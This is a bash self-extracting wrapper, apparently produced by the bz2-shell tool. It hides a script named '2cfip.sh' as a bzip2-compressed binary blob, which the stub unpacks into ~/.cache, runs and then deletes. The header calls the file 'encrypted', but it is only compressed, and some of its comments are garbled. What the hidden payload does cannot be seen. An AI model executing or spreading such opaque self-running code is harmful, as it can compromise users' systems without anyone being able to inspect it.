#!/bin/bash
#
# Encrypted by Rangga Fajar Oktariansyah (Anak Gabut Thea)
#
# This file has been encrypted with BZip2 Shell Exec <https://github.com/FajarKim/bz2-shell>
# The filename '2cfip.sh' encrypted at Mon Apr  1 06:55:14 UTC 2024
# I try invoking the compressed executable with the original name
# (for programs looking at their name).  We also try to retain the original
# file permissions on the compressed file.  For safety reasons, bzsh will
# not create setuid or setgid shell scripts.
#
# WARNING: the first line of this file must be either : or #!/bin/bash
# The : is required for some old versions of csh.
# On Ultrix, /bin/bash is too buggy, change the first line to: #!/bin/bash5
#
# Don't forget to follow me on <https://github.com/FajarKim>
skip=75

tab='	'
nl='
'
IFS=" $tab$nl"

# Make sure important variables exist if not already defined
# $USER is defined by login(1) which is not always executed (e.g. containers)
# POSIX: https://pubs.opengroup.org/onlinepubs/009695299/utilities/id.html
USER=${USER:-$(id -u -n)}
# $HOME is defined at the time of login, but it could be unset. If it is unset,
# a tilde by itself (~) will not be expanded to the current user's home directory.
# POSIX: https://pubs.opengroup.org/onlinepubs/009696899/basedefs/xbd_chap08.html#tag_08_03
HOME="${HOME:-$(getent passwd $USER 2>/dev/null | cut -d: -f6)}"
# macOS does not have getent, but this works even if $HOME is unset
HOME="${HOME:-$(eval echo ~$USER)}"
umask=`umask`
umask 77

bztmpdir=
trap 'res=$?
  test -n "$bztmpdir" && rm -fr "$bztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | */tmp/) test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
  */tmp) TMPDIR=$TMPDIR/; test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
  *:* | *) TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
esac
if type mktemp >/dev/null 2>&1; then
  bztmpdir=`mktemp -d "${TMPDIR}bztmpXXXXXXXXX"`
else
  bztmpdir=${TMPDIR}bztmp$$; mkdir $bztmpdir
fi || { (exit 127); exit 127; }

bztmp=$bztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$bztmp" && rm -r "$bztmp";;
*/*) bztmp=$bztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | bzip2 -cd > "$bztmp"; then
  umask $umask
  chmod 700 "$bztmp"
  (sleep 5; rm -fr "$bztmpdir") 2>/dev/null &
  "$bztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress ${0##*/}"
  printf >&2 '%s\n' "Report bugs to <fajarrkim@gmail.com>."
  (exit 127); res=127
fi; exit $res
BZh91AY&SY���� p_�0}����������w����������� :�Q� �    5@HBJF���='�zM�`�A���i�4i��z �����  14 4 ѡL �� ɦ�����d�ш10	�@h���M24Ѡdɓ L�����)�  @     4        ���T�4    ��   !�4d�     2a@41M4d�Fd�&��A�ɀMF@�4�i���&L� E"	�4�C@D�hI�$�O1��=OT�L�3S�z�� F�4�i䙩i���7�������Ԇt� {�U���#e���r�x��L��\��a��-�M��9��N�R���h��u��fPS��g�_O^�1�Q�"�%vҵ�]���M�\T��U�¦�X
���,�4ejǉf3k�� �ߨ��J�B��p` �"#�/:�{ER�X�������5@��7�r� A���΁�\�Pz��yR�=G�}�&�~=��xy]�s�d�i5v1�y
:��'-����XX�a`�����ܱ������e��3C�!5#*�&�8��;(�I��9"p 4�@Ȝ  ��n���Q$0Gc�if�C�2�v��r���
D+�0��?4$�q��L�f�M\�����3`�yR��Je�a"��^��!��H8Or�J�ڃ�P,�h1����T���m �Ƞ����0Zg뱹��U~j��ATYX��F� ��"MV!(�H�H&�K�x��N�Y���ͣ��,�#S�2�e{�<y��Q�mR����I��N���;�1�U��9�ù4�1
({1�������󥈬`�d2�������t�B�M}�K�����q`����.�q1!`ފ1~�d���+�� \���+J��=��@���I{�h8�T���qъl���:�'T�=X�B)�����1׳?�߆ ����*�ԗ{?a��b�ۘF q�5�uր�վ*z#�MV�`��Q!��Wx�4��I�s��9���iw�\�&M1���i�GV<��N@���XE)�w~��qp\T%���@K�����d�!J�B��"�B�        %)JR��)D��4[�����'U��"Y!�l��n���c0��8��.u4W'��0�0��zl�B�!
ǡo����e�u��FzG3��X��yg�L|� � � ��e�!� ���/�""Bf@��2�sVsi �h�&H�����f��/H�jC��2a�{
�H��/q�� bsBH) I!QP�ӚW0�Q*8ˏ+�>���J[i�'~ ^���Ky�sc:��n��N��\L�x�� RWd��ɖB\�6���!h�z������'�Y?裸���X���D @z>�L���H^0�m
��j3|��)��	��%<�����O�@P���B#m^���|��	w����p�󍅏��8���� ��$2
h�@�<�%�(��K͆#�݅_o.\d〕�
v�]\�k�ϋ�w���O{s��R`a#`aB �;��`a��`a��`a��`a�����G\7C���y��ɔ:k[.�'G�<�r/.�-��!��z���Y $��T�8á1uj��Q)K��t��+�@�.�@���Eb�(Q�Pt~P�������hp̈��p4�d�Xtg)b&�:0���M�$���wLE�����[E6zB���L��"6B�q�}3����#x�:�"K������M3H�m܅��XB�A�*!��pI� p�(+�K�񨷂R�`0ol�b��Ij+�����q��A�"T!� �j>�<*@	H��D���쮍�J11
V2��ӹ�}91�q�
y�����D9�
��s�l `��S,鎩�qr!�o���^rr�&�o�R�<p�H>L7o߯ÁM<�k�<] �B�,1���!�&5�F�-<�m C��p��q	$E��)D�KL#@0*�J��I4K�r�%i��;M�5(&�=X7����,�5)C�/վ�F�����a$A	�0
RAF�	%��sOY�)�X�t;m�.�j��{9�1"�n#$^�RQ�L�䞐��� "�3�2�v95s����M� �������]��"�"���#=� _i�3_E�pf�n��	��� �E/#��I)D�b ��D�`s�H!�����1L��%��6�o����H@����0�A��p mH�3��@پ�0��>�X����.��0_ݑ=ey��P�
�uh�G�(b�M�g$�0�0U^_�i<�v� t�6�ycg@>+���u�Uo}7@�D��0����	��<�$�(@y�@�CP�ơ����nC@a�6��oX�|� 	�H�^���ut�$2g�1\f��*6dl�<ה��1^Q{����+�o�B@��"���5�"��e	�L��'2�T=D��fl�:��w���������]EÌ��t�JH_��X�А4܏�����MZ &\27(?���n���~,�b��<��1����)���#�s�Z7_�!�3�=/H�Sf�!�2/�p��R�D Y�	H�,Ɲhc�u桐�ry=(��\ ��ĒgO�yZڪ|�p�r�RWQ�fE�a�$���&��&y7|�� ���PLa9�M��`xM��_�\/$�ʷ(�ak�T�Q�5f���q�����џ.$�r@��i�E܉ş��L&rpY��4W�J0�bf'�Wҷ�;�j�0�C��.�����>�_�]�|���=��;x&=A��>�|�s����� �g��������rSO^ޟ�vu}Ek�C����kJm�0���u;Wj����������?���w�'�3 �U��QE�rE8P�����